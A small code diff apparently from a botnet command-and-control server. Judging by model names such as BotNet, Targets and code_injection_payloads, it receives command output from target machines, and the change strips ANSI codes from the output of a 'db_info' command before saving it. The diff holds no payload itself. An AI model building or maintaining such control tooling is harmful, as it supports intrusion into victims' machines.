@@ -36,7 +36,7 @@ import os
 from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet, Instruction_Detail, code_injection_payloads
 from db.mange_db import config, _create_engine
 from utility.email_temp import EmailTemplate
-from utility.processer import log, getlist, readFromJson, update_output, update_user_info, update_target_info, update_socket_info, update_code_output, clean_ANSI_escape_text
+from utility.processer import log, getlist, readFromJson, update_output, update_user_info, update_target_info, update_socket_info, update_code_output, clean_ANSI_escape_text,strip_ansi
 
 
 
@@ -163,6 +163,8 @@ def save_output():
                 opreatingSystem = data.get('os')
 
                 for output in outputs:
+                    if _session.query(APICommand).filter_by(ID=output[0]).first().cmd == 'db_info':
+                        output[1] = strip_ansi(output[1], 'db_info')
                     update_output(target_name, output[0], output[1],)
                     _session.query(APICommand).filter_by(ID=output[0]).update(
                         {
